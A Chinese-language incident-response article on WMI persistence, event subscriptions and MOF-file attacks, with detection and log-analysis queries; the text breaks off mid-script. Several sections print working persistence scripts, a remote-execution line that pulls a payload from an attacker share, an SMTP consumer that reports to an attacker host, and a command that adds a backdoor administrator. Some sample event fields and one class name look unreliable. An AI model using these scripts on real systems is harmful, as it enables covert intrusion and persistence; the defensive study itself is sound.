---
title: "WMI持久化与事件订阅取证分析"
date: 2026-06-24T09:00:00+08:00
draft: false
weight: 370
description: "围绕 WMI 持久化与事件订阅的完整攻击链，深入分析 WMI 架构基础、临时事件订阅、永久事件订阅、MOF 文件攻击、WMI 攻击链取证、检测工具链、证据强度分层、公开案例、自动化狩猎脚本等技术。"
categories: ["应急响应", "取证分析"]
tags: ["WMI", "事件订阅", "持久化", "MOF", "FilterToConsumerBinding", "EventConsumer", "EventFilter"]
---

# WMI持久化与事件订阅取证分析

Windows Management Instrumentation（WMI）是 Windows 系统中最强大的管理自动化框架之一，也是攻击者实现持久化、远程执行和横向移动的核心工具。WMI 内置于所有现代 Windows 系统，提供了丰富的系统管理能力，包括进程创建、服务管理、注册表操作、事件监控等功能。

MITRE ATT&CK 框架中，WMI 相关技术覆盖了多个战术领域：T1047（Windows Management Instrumentation）用于执行，T1546.003（Windows Management Instrumentation Event Subscription）用于持久化和权限提升。Red Canary 的威胁检测报告显示，WMI 滥用在企业环境中持续增长，特别是在高级持续性威胁（APT）攻击中。

已有文章 `PowerShell攻击链与日志取证分析` 覆盖了 PowerShell 攻击链的取证方法。本文换一个角度：**不讨论通用的 PowerShell 取证，而是聚焦于 WMI 的完整攻击链，深入分析 WMI 架构基础、事件订阅机制、永久事件订阅攻击、MOF 文件攻击、WMI 攻击链取证、事件日志分析、检测工具链、证据强度分层、公开案例和自动化狩猎脚本。**

---

## 0x01 WMI 架构基础

### WMI 核心组件

WMI（Windows Management Instrumentation）是基于 Web-Based Enterprise Management（WBEM）标准的 Windows 管理框架。其核心组件包括：

**CIMOM（Common Information Model Object Manager）**

CIMOM 是 WMI 的核心引擎，负责管理 WMI 命名空间、类、实例和查询。CIMOM 服务（winmgmt.exe）在系统启动时自动运行，作为 SVCHOST 进程的一部分。

```powershell
Get-Service winmgmt | Select-Object Name, Status, StartType
```

**WMI Repository（WMI 仓库）**

WMI Repository 是一个面向对象数据库，存储了所有 WMI 类、实例和命名空间的定义。仓库位于 `%SystemRoot%\System32\wbem\Repository` 目录下。

```powershell
Get-WmiObject -Namespace "root" -Class "__Namespace" | Select-Object Name
```

**WMI Providers（WMI 提供程序）**

WMI Providers 是连接 WMI 和系统管理对象的桥梁。Provider 负责从底层系统收集数据并传递给 WMI，或将 WMI 操作转换为对底层系统的操作。

常见的 WMI Provider：
- **Win32 Provider**：提供 Windows 系统信息（进程、服务、用户等）
- **Registry Provider**：提供注册表访问能力
- **Event Log Provider**：提供事件日志访问能力
- **WDM Provider**：提供 Windows 驱动模型访问能力

```powershell
Get-WmiObject -Namespace "root\cimv2" -Class "__Win32Provider" | Select-Object Name, CLSID
```

### WMI 命名空间

WMI 使用命名空间组织管理对象，类似于文件系统的目录结构。核心命名空间包括：

**root\cimv2**

最常用的命名空间，包含 Windows 系统管理类，如 Win32_Process、Win32_Service、Win32_UserAccount 等。

```powershell
Get-WmiObject -Namespace "root\cimv2" -Class Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber
```

**root\subscription**

事件订阅命名空间，包含事件过滤器（EventFilter）、事件消费者（EventConsumer）和绑定（FilterToConsumerBinding）等类。攻击者利用此命名空间实现持久化。

```powershell
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -Namespace "root\subscription" -Class __EventConsumer
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding
```

**root\default**

包含系统默认类，如 StdRegProv（注册表提供程序）。

```powershell
Get-WmiObject -Namespace "root\default" -Class StdRegProv
```

### WMI 类

WMI 类定义了管理对象的结构和行为。常用的 WMI 类包括：

**Win32_Process**：进程管理

```powershell
Get-WmiObject -Class Win32_Process | Select-Object ProcessId, Name, CommandLine | Format-Table -AutoSize
```

**Win32_Service**：服务管理

```powershell
Get-WmiObject -Class Win32_Service | Where-Object {$_.State -eq "Running"} | Select-Object Name, DisplayName, PathName
```

**Win32_UserAccount**：用户账户管理

```powershell
Get-WmiObject -Class Win32_UserAccount | Select-Object Name, Domain, Status
```

**Win32_StartupCommand**：启动项管理

```powershell
Get-WmiObject -Class Win32_StartupCommand | Select-Object Name, Command, Location
```

### WMI 查询语言（WQL）

WQL（WMI Query Language）是 WMI 的查询语言，类似于 SQL。WQL 用于查询 WMI 类和实例，支持 SELECT、WHERE、FROM 等关键字。

**基础查询**

```powershell
Get-WmiObject -Query "SELECT * FROM Win32_Process WHERE Name='powershell.exe'"
```

**事件查询**

```powershell
$query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
Register-WmiEvent -Query $query -SourceName "ProcessCreation"
```

**关联查询**

```powershell
Get-WmiObject -Query "ASSOCIATORS OF {Win32_Process.Handle=$PID} WHERE AssocClass=Win32_ProcessParentCycle"
```

### WMI 远程执行机制

WMI 支持远程管理，攻击者可以利用 WMI 在远程系统上执行命令。

**使用 WMIC 远程执行**

```cmd
wmic /node:192.168.1.100 /user:administrator /password:Password123 process call create "cmd.exe /c powershell -ep bypass -file \\attacker\share\payload.ps1"
```

**使用 PowerShell 远程执行**

```powershell
$options = New-CimSessionOption -Protocol Dcom
$session = New-CimSession -ComputerName "192.168.1.100" -Credential $cred -SessionOption $options
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\temp\payload.ps1"}
```

**使用 Invoke-WmiMethod 远程执行**

```powershell
$cred = Get-Credential
Invoke-WmiMethod -ComputerName "192.168.1.100" -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c powershell -ep bypass -file C:\temp\payload.ps1" -Credential $cred
```

关键认知：WMI 远程执行不需要在目标系统上安装任何额外软件，只需要有效的管理员凭据和网络连接。WMI 使用 DCOM（Distributed Component Object Model）或 WinRM（Windows Remote Management）协议进行通信。

---

## 0x02 WMI 事件订阅机制

### 事件订阅的三个核心组件

WMI 事件订阅由三个核心组件组成：EventFilter（事件过滤器）、EventConsumer（事件消费者）和 FilterToConsumerBinding（过滤器到消费者的绑定）。

**EventFilter（事件过滤器）**

EventFilter 定义了触发事件的条件。它使用 WQL 查询语言指定要监控的事件类型和条件。

```powershell
$filter = @{
    Name = "MaliciousFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}
Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filter
```

**EventConsumer（事件消费者）**

EventConsumer 定义了事件触发时要执行的操作。WMI 提供了多种事件消费者类型，包括命令行执行、脚本执行、日志写入等。

```powershell
$consumer = @{
    Name = "MaliciousConsumer"
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\temp\payload.ps1"
}
Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumer
```

**FilterToConsumerBinding（过滤器到消费者的绑定）**

FilterToConsumerBinding 将 EventFilter 和 EventConsumer 关联起来，形成完整的事件订阅。

```powershell
$binding = @{
    Filter = "__EventFilter.Name='MaliciousFilter'"
    Consumer = "CommandLineEventConsumer.Name='MaliciousConsumer'"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $binding
```

### 临时事件订阅 vs 永久事件订阅

**临时事件订阅（Temporary Event Subscription）**

临时事件订阅使用 `Register-WmiEvent` 或 `Register-CimIndicationEvent` 命令创建，仅在当前 PowerShell 会话中有效。当会话结束时，事件订阅自动删除。

```powershell
$query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='malware.exe'"
Register-WmiEvent -Query $query -SourceName "MalwareDetection" -Action {
    Write-Host "Malware detected: $($Event.SourceEventArgs.NewEvent.TargetInstance.Name)"
}
```

**永久事件订阅（Permanent Event Subscription）**

永久事件订阅使用 `Set-WmiInstance` 命令创建，存储在 WMI Repository 中，即使系统重启后仍然有效。这是攻击者实现持久化的关键技术。

```powershell
$filter = @{
    Name = "PersistenceFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}
Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filter

$consumer = @{
    Name = "PersistenceConsumer"
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\temp\backdoor.ps1"
}
Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumer

$binding = @{
    Filter = "__EventFilter.Name='PersistenceFilter'"
    Consumer = "CommandLineEventConsumer.Name='PersistenceConsumer'"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $binding
```

关键认知：永久事件订阅是 WMI 持久化的核心。它在系统启动后 240-325 秒触发，执行恶意载荷。由于 WMI Repository 不存储文件，传统的文件扫描无法检测这种持久化方式。

### 事件消费者类型

WMI 提供了五种事件消费者类型：

**CommandLineEventConsumer**

执行命令行命令，是最常用的事件消费者。

```powershell
$consumer = @{
    Name = "CmdConsumer"
    CommandLineTemplate = "cmd.exe /c powershell -ep bypass -file C:\temp\payload.ps1"
}
Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumer
```

**ActiveScriptEventConsumer**

执行 VBScript 或 JScript 脚本。

```powershell
$consumer = @{
    Name = "ScriptConsumer"
    ScriptingEngine = "VBScript"
    ScriptText = "Set objShell = CreateObject(""WScript.Shell"") : objShell.Run ""powershell.exe -ep bypass -file C:\temp\payload.ps1"", 0, True"
}
Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments $consumer
```

**LogFileEventConsumer**

将事件数据写入日志文件。

```powershell
$consumer = @{
    Name = "LogConsumer"
    Filename = "C:\Windows\Temp\wmi_log.txt"
    Text = "Event triggered at %TimeCreated%"
}
Set-WmiInstance -Namespace root\subscription -Class LogFileEventConsumer -Arguments $consumer
```

**NTEventLogEventConsumer**

将事件写入 Windows 事件日志。

```powershell
$consumer = @{
    Name = "NTLogConsumer"
    Source = "WMIEvent"
    EventID = 9999
    Message = "WMI event triggered"
}
Set-WmiInstance -Namespace root\subscription -Class NTEventLogEventConsumer -Arguments $consumer
```

**SMTPEventConsumer**

发送电子邮件通知。

```powershell
$consumer = @{
    Name = "SMTPConsumer"
    SMTPServer = "smtp.attacker.com"
    To = "attacker@attacker.com"
    From = "victim@victim.com"
    Subject = "WMI Event Triggered"
    Message = "Event triggered on victim system"
}
Set-WmiInstance -Namespace root\subscription -Class SMTPEventConsumer -Arguments $consumer
```

### 事件触发条件和过滤器

事件过滤器使用 WQL 查询定义触发条件。常见的事件类型包括：

**__InstanceCreationEvent**：实例创建事件

```sql
SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'
```

**__InstanceModificationEvent**：实例修改事件

```sql
SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325
```

**__InstanceDeletionEvent**：实例删除事件

```sql
SELECT * FROM __InstanceDeletionEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'
```

**__TimerEvent**：定时器事件

```sql
SELECT * FROM __TimerEvent WHERE TimerId = "MyTimer"
```

关键认知：攻击者通常使用 `__InstanceModificationEvent` 和系统启动时间作为触发条件，确保恶意载荷在系统启动后执行。

---

## 0x03 WMI 永久事件订阅攻击

### 使用 PowerShell 创建永久事件订阅

攻击者可以使用 PowerShell 创建永久事件订阅实现持久化。

**完整攻击脚本**

```powershell
$filterArgs = @{
    Name = "WindowsUpdateFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}
Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{
    Name = "WindowsUpdateConsumer"
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"
}
Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

$bindingArgs = @{
    Filter = "__EventFilter.Name='WindowsUpdateFilter'"
    Consumer = "CommandLineEventConsumer.Name='WindowsUpdateConsumer'"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
```

**验证事件订阅**

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "WindowsUpdateFilter"}
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq "WindowsUpdateConsumer"}
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like "*WindowsUpdateFilter*"}
```

### 使用 MOF 文件创建事件订阅

MOF（Managed Object Format）文件是 WMI 的配置文件格式，攻击者可以使用 MOF 文件创建事件订阅。

**MOF 文件示例**

```mof
pragma namespace("\\\\.\\root\\subscription")

Instance of __EventFilter as $EventFilter
{
    Name = "MOFFilter";
    EventNamespace = "Root\\cimv2";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325";
    QueryLanguage = "WQL";
};

Instance of CommandLineEventConsumer as $Consumer
{
    Name = "MOFConsumer";
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\temp\payload.ps1";
};

Instance of __FilterToConsumerBinding
{
    Filter = $EventFilter;
    Consumer = $Consumer;
};
```

**编译 MOF 文件**

```cmd
mofcomp C:\temp\persistence.mof
```

### 使用 WMIC 创建事件订阅

WMIC（Windows Management Instrumentation Command-line）是 WMI 的命令行工具，攻击者可以使用 WMIC 创建事件订阅。

**创建事件过滤器**

```cmd
wmic /namespace:\\root\subscription path __EventFilter create Name="WMICFilter",EventNameSpace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
```

**创建事件消费者**

```cmd
wmic /namespace:\\root\subscription path CommandLineEventConsumer create Name="WMICConsumer",CommandLineTemplate="powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\temp\payload.ps1"
```

**创建绑定**

```cmd
wmic /namespace:\\root\subscription path __FilterToConsumerBinding create Filter="__EventFilter.Name=\"WMICFilter\"",Consumer="CommandLineEventConsumer.Name=\"WMICConsumer\""
```

### 事件订阅的持久化效果

永久事件订阅具有以下持久化特性：

**重启后仍然有效**

永久事件订阅存储在 WMI Repository 中，系统重启后自动加载。攻击者无需修改注册表启动项或计划任务即可实现持久化。

**不依赖文件**

WMI Repository 是二进制数据库，不包含可执行文件。传统的文件扫描和哈希检测无法发现这种持久化方式。

**隐蔽性强**

WMI 事件订阅不会在任务管理器中显示明显的异常进程，也不会创建明显的服务或计划任务。

**难以检测**

WMI 事件订阅使用系统内置的管理功能，不会触发传统的入侵检测规则。

关键认知：WMI 永久事件订阅是一种高级持久化技术，具有隐蔽性强、难以检测、重启后仍然有效等特点。防御者需要使用专门的 WMI 检测工具和事件日志分析技术来发现这种持久化方式。

---

## 0x04 MOF 文件攻击

### MOF 文件格式和语法

MOF（Managed Object Format）文件是 WMI 的配置文件格式，用于定义 WMI 类、实例和命名空间。MOF 文件使用文本格式，易于编写和修改。

**MOF 文件基本语法**

```mof
pragma namespace("\\\\.\\root\\subscription")

Instance of ClassName as $Alias
{
    PropertyName1 = "Value1";
    PropertyName2 = "Value2";
};
```

**MOF 文件关键字**

- `pragma`：编译指令，用于指定命名空间等
- `Instance of`：创建类实例
- `as $Alias`：为实例指定别名，用于引用
- 属性赋值：使用 `PropertyName = "Value"` 格式

### MOF 文件自动编译机制

Windows 系统会自动监控特定目录中的 MOF 文件，并在发现新文件时自动编译。

**自动编译目录**

```
%SystemRoot%\System32\wbem\Autorecover
```

当攻击者将 MOF 文件放入此目录时，系统会自动编译并执行其中的指令。

**手动编译 MOF 文件**

```cmd
mofcomp C:\temp\persistence.mof
```

**mofcomp.exe 位置**

```
%SystemRoot%\System32\wbem\mofcomp.exe
```

### MOF 文件攻击的实现

攻击者可以使用 MOF 文件实现多种攻击目标：

**持久化攻击**

```mof
pragma namespace("\\\\.\\root\\subscription")

Instance of __EventFilter as $EventFilter
{
    Name = "BackdoorFilter";
    EventNamespace = "Root\\cimv2";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325";
    QueryLanguage = "WQL";
};

Instance of CommandLineEventConsumer as $Consumer
{
    Name = "BackdoorConsumer";
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAA=";
};

Instance of __FilterToConsumerBinding
{
    Filter = $EventFilter;
    Consumer = $Consumer;
};
```

**横向移动攻击**

攻击者可以将 MOF 文件复制到远程系统的自动编译目录，实现横向移动。

```cmd
copy persistence.mof \\192.168.1.100\C$\Windows\System32\wbem\Autorecover\
```

**权限提升攻击**

攻击者可以使用 MOF 文件以 SYSTEM 权限执行命令。

```mof
Instance of CommandLineEventConsumer as $Consumer
{
    Name = "SystemConsumer";
    CommandLineTemplate = "cmd.exe /c net user attacker Password123 /add && net localgroup administrators attacker /add";
    RunInteractively = false;
};
```

### MOF 文件攻击的检测

**检测 MOF 文件创建**

```powershell
Get-ChildItem -Path "C:\Windows\System32\wbem\Autorecover\" -Filter "*.mof" -Recurse
```

**检测 MOF 文件编译**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='Mof'} | Select-Object TimeCreated, Id, Message | Format-Table -AutoSize
```

**检测 WMI 事件订阅**

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

**检测可疑进程创建**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | Where-Object {$_.Message -like "*mofcomp.exe*" -or $_.Message -like "*mof*"} | Select-Object TimeCreated, Message | Format-Table -AutoSize
```

关键认知：MOF 文件攻击是一种隐蔽的攻击方式，利用 WMI 的自动编译机制实现持久化和横向移动。防御者需要监控 MOF 文件的创建和编译，以及 WMI 事件订阅的创建。

---

## 0x05 WMI 攻击链取证

### WMI 远程执行的取证特征

WMI 远程执行会在目标系统上留下多个取证特征：

**进程树特征**

WMI 远程执行创建的进程树通常为：

```
svchost.exe (WMI 服务)
  └─ WmiPrvSE.exe (WMI Provider Host)
      └─ cmd.exe / powershell.exe (执行的命令)
```

**进程创建事件（Event ID 4688）**

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" />
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2026-06-24T09:15:23.456789000Z" />
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-18</Data>
    <Data Name="SubjectUserName">SYSTEM</Data>
    <Data Name="NewProcessId">0x1a2b</Data>
    <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\temp\payload.ps1</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
  </EventData>
</Event>
```

**网络通信特征**

WMI 远程执行使用 DCOM（TCP 135）或 WinRM（TCP 5985/5986）协议。

```powershell
Get-NetTCPConnection | Where-Object {$_.LocalPort -eq 135 -or $_.LocalPort -eq 5985 -or $_.LocalPort -eq 5986} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
```

### WMI 事件订阅的取证特征

WMI 事件订阅会在系统中留下多个取证特征：

**WMI Repository 修改**

WMI 事件订阅存储在 WMI Repository 中，可以通过 WMI 查询发现。

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select-Object Name, Query, QueryLanguage
Get-WmiObject -Namespace root\subscription -Class __EventConsumer | Select-Object Name, CommandLineTemplate
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Select-Object Filter, Consumer
```

**可疑的事件过滤器**

攻击者创建的事件过滤器通常具有以下特征：
- 使用系统启动时间作为触发条件
- 查询 `Win32_PerfFormattedData_PerfOS_System` 类
- 触发时间范围在 240-325 秒之间

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Query -like "*SystemUpTime*" -and $_.Query -like "*240*"}
```

**可疑的事件消费者**

攻击者创建的事件消费者通常具有以下特征：
- 执行 PowerShell 命令
- 使用 EncodedCommand 参数
- 命令行包含混淆或编码内容

```powershell
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.CommandLineTemplate -like "*powershell*" -and $_.CommandLineTemplate -like "*EncodedCommand*"}
```

### WMI 持久化的取证特征

WMI 持久化会在系统中留下多个取证特征：

**WMI 服务日志**

WMI 服务（winmgmt）会在应用程序日志中记录活动。

```powershell
Get-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='Microsoft-Windows-WMI'} | Select-Object TimeCreated, Id, Message | Format-Table -AutoSize
```

**PowerShell 脚本块日志（Event ID 4104）**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Where-Object {$_.Message -like "*__EventFilter*" -or $_.Message -like "*__EventConsumer*" -or $_.Message -like "*__FilterToConsumerBinding*"} | Select-Object TimeCreated, Message | Format-Table -AutoSize
```

**Sysmon 日志（Event ID 19-21）**

Sysmon 可以监控 WMI 事件订阅活动。

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=19,20,21} | Select-Object TimeCreated, Id, Message | Format-Table -AutoSize
```

### WMI 与横向移动的关联分析

WMI 常用于横向移动攻击，需要与其他日志关联分析：

**关联 Event ID 4648（显式凭据登录）**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4648} | Where-Object {$_.Message -like "*WmiPrvSE.exe*"} | Select-Object TimeCreated, Message | Format-Table -AutoSize
```

**关联 Event ID 4624（登录成功）**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Properties[8].Value -like "*WmiPrvSE.exe*"} | Select-Object TimeCreated, Message | Format-Table -AutoSize
```

**关联网络日志**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} | Where-Object {$_.Message -like "*135*" -or $_.Message -like "*5985*"} | Select-Object TimeCreated, Message | Format-Table -AutoSize
```

关键认知：WMI 攻击链取证需要综合分析进程树、事件日志、网络通信和 WMI Repository 等多个数据源。通过关联分析可以发现 WMI 远程执行、事件订阅和横向移动等攻击行为。

---

## 0x06 WMI 事件日志分析

### Event ID 5857-5861（WMI 活动监控）

Windows 系统提供了专门的 WMI 活动监控事件 ID：

**Event ID 5857：WMI Provider 加载**

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-WMI-Activity" />
    <EventID>5857</EventID>
    <TimeCreated SystemTime="2026-06-24T09:15:23.456789000Z" />
  </System>
  <EventData>
    <Data Name="ProviderName">Win32_Process</Data>
    <Data Name="ProviderPath">C:\Windows\System32\wbem\Win32Provider.dll</Data>
    <Data Name="ProcessID">1234</Data>
  </EventData>
</Event>
```

**Event ID 5858：WMI 错误**

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-WMI-Activity" />
    <EventID>5858</EventID>
    <TimeCreated SystemTime="2026-06-24T09:15:23.456789000Z" />
  </System>
  <EventData>
    <Data Name="ErrorId">CWMI_ERROR_0x80041003</Data>
    <Data Name="ProviderName">Win32_Process</Data>
    <Data Name="ProcessID">1234</Data>
  </EventData>
</Event>
```

**Event ID 5859：WMI 过滤器活动**

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-WMI-Activity" />
    <EventID>5859</EventID>
    <TimeCreated SystemTime="2026-06-24T09:15:23.456789000Z" />
  </System>
  <EventData>
    <Data Name="FilterName">MaliciousFilter</Data>
    <Data Name="FilterNamespace">root\subscription</Data>
    <Data Name="ProcessID">1234</Data>
  </EventData>
</Event>
```

**Event ID 5860：WMI 临时事件订阅**

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-WMI-Activity" />
    <EventID>5860</EventID>
    <TimeCreated SystemTime="2026-06-24T09:15:23.456789000Z" />
  </System>
  <EventData>
    <Data Name="Namespace">root\cimv2</Data>
    <Data Name="Query">SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'</Data>
    <Data Name="User">DOMAIN\user</Data>
    <Data Name="ProcessID">1234</Data>
  </EventData>
</Event>
```

**Event ID 5861：WMI 永久事件订阅**

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-WMI-Activity" />
    <EventID>5861</EventID>
    <TimeCreated SystemTime="2026-06-24T09:15:23.456789000Z" />
  </System>
  <EventData>
    <Data Name="Namespace">root\subscription</Data>
    <Data Name="FilterName">MaliciousFilter</Data>
    <Data Name="ConsumerName">MaliciousConsumer</Data>
    <Data Name="User">DOMAIN\user</Data>
    <Data Name="ProcessID">1234</Data>
  </EventData>
</Event>
```

### Event ID 4648（显式凭据登录）

Event ID 4648 记录了使用显式凭据的登录尝试，常用于检测 WMI 横向移动。

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" />
    <EventID>4648</EventID>
    <TimeCreated SystemTime="2026-06-24T09:15:23.456789000Z" />
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-21-1234567890-1234567890-1234567890-1001</Data>
    <Data Name="SubjectUserName">user</Data>
    <Data Name="SubjectDomainName">DOMAIN</Data>
    <Data Name="TargetServerName">192.168.1.100</Data>
    <Data Name="TargetUserName">administrator</Data>
    <Data Name="TargetDomainName">DOMAIN</Data>
    <Data Name="ProcessName">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name="ProcessId">0x1a2b</Data>
    <Data Name="IpAddress">192.168.1.50</Data>
    <Data Name="IpPort">12345</Data>
  </EventData>
</Event>
```

### Event ID 4688（进程创建）

Event ID 4688 记录了进程创建事件，是检测 WMI 攻击的关键数据源。

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" />
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2026-06-24T09:15:23.456789000Z" />
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-18</Data>
    <Data Name="SubjectUserName">SYSTEM</Data>
    <Data Name="SubjectDomainName">NT AUTHORITY</Data>
    <Data Name="NewProcessId">0x1a2b</Data>
    <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\temp\payload.ps1</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name="TokenElevationType">%%1936</Data>
    <Data Name="MandatoryLabel">S-1-16-16384</Data>
  </EventData>
</Event>
```

### WMI 活动的时间线分析

WMI 攻击活动的时间线分析是取证调查的关键步骤：

**步骤一：收集所有 WMI 相关事件**

```powershell
$startTime = (Get-Date).AddDays(-7)
$endTime = Get-Date

$wmiEvents = Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-WMI-Activity/Operational'
    StartTime = $startTime
    EndTime = $endTime
} -ErrorAction SilentlyContinue

$securityEvents = Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4648, 4688
    StartTime = $startTime
    EndTime = $endTime
} -ErrorAction SilentlyContinue

$sysmonEvents = Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Sysmon/Operational'
    ID = 1, 3, 19, 20, 21
    StartTime = $startTime
    EndTime = $endTime
} -ErrorAction SilentlyContinue
```

**步骤二：按时间排序**

```powershell
$allEvents = @()
$allEvents += $wmiEvents | Select-Object TimeCreated, Id, LogName, Message
$allEvents += $securityEvents | Select-Object TimeCreated, Id, LogName, Message
$allEvents += $sysmonEvents | Select-Object TimeCreated, Id, LogName, Message

$allEvents | Sort-Object TimeCreated | Format-Table -AutoSize
```

**步骤三：识别攻击模式**

```powershell
$attackPattern = $allEvents | Where-Object {
    $_.Message -like "*WmiPrvSE.exe*" -or
